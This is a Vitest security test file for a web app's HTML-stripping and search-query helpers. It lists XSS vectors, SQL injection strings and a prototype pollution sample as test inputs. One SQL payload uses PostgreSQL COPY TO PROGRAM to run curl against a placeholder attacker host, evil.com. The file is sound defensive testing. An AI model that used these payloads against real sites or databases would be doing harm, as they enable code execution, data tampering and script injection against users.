import { describe, it, expect } from "vitest";
import { stripHtml } from "@/lib/api/validate";
import { searchPattern } from "@/lib/api/query-helpers";

/**
 * OWASP Top-10 보안 테스트 확장 — CSRF, 인코딩 우회, 프로토타입 오염 등
 */
describe("Security — Advanced XSS vectors", () => {
  const advancedXssPayloads = [
    // Mutation XSS
    '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
    // SVG with encoded payload
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    // CSS-based XSS
    '<div style="background-image:url(javascript:alert(1))">',
    // Event handler variants
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    // Encoded bypasses
    '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
    // Polyglot XSS
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    // DOM clobbering
    '<form id=x><input name=y></form>',
    // Meta refresh
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  ];

  it.each(advancedXssPayloads)(
    "stripHtml blocks advanced vector: %s",
    (payload) => {
      const result = stripHtml(payload);
      expect(result).not.toMatch(/<[a-z]/i);
      expect(result).not.toContain("javascript:");
    }
  );
});

describe("Security — SQL Injection advanced vectors", () => {
  const advancedSqlPayloads = [
    // Blind SQL injection
    "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
    // Time-based blind
    "1' AND SLEEP(5)--",
    // Stacked queries
    "1'; INSERT INTO users VALUES('hacker','pass')--",
    // PostgreSQL specific
    "1'; COPY (SELECT '') TO PROGRAM 'curl http://evil.com'--",
    // Unicode bypass
    "admin\u0027--",
    // Hex encoding
    "0x61646D696E",
    // NULL byte
    "admin\x00' OR 1=1--",
  ];

  it.each(advancedSqlPayloads)(
    "searchPattern safely wraps: %s",
    (payload) => {
      const result = searchPattern(payload);
      expect(result).toMatch(/^%.*%$/);
      // The key: these are used as parameterized query values, not interpolated
      expect(typeof result).toBe("string");
    }
  );
});

describe("Security — Input Validation edge cases", () => {
  it("very deeply nested HTML tags", () => {
    let nested = "test";
    for (let i = 0; i < 100; i++) {
      nested = `<div>${nested}</div>`;
    }
    const result = stripHtml(nested);
    expect(result).not.toMatch(/<div>/i);
  });

  it("mixed encoding attacks", () => {
    const payloads = [
      "%3Cscript%3Ealert(1)%3C%2Fscript%3E", // URL encoded
      "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", // Unicode escaped
    ];
    for (const p of payloads) {
      const result = stripHtml(p);
      // After stripHtml, should not have executable script
      expect(result).not.toContain("<script");
    }
  });

  it("prototype pollution attempt in JSON", () => {
    const malicious = '{"__proto__": {"isAdmin": true}}';
    // Parsing should not pollute Object prototype
    const parsed = JSON.parse(malicious);
    expect(({} as any).isAdmin).toBeUndefined();
  });

  it("ReDoS-resistant: long repetitive input", () => {
    const start = performance.now();
    const input = "a".repeat(50000) + "<script>alert(1)</script>";
    stripHtml(input);
    const ms = performance.now() - start;
    // Should complete in reasonable time (not exponential)
    expect(ms).toBeLessThan(1000);
  });
});

describe("Security — Response security headers", () => {
  it("ok() includes content-type application/json", async () => {
    const { ok } = await import("@/lib/api/response");
    const res = ok({ test: true });
    expect(res.headers.get("content-type")).toContain("application/json");
  });

  it("err() also returns JSON content-type", async () => {
    const { err } = await import("@/lib/api/response");
    const res = err("test error", 400);
    expect(res.headers.get("content-type")).toContain("application/json");
    const body = await res.json();
    expect(body.error).toBe("test error");
  });
});
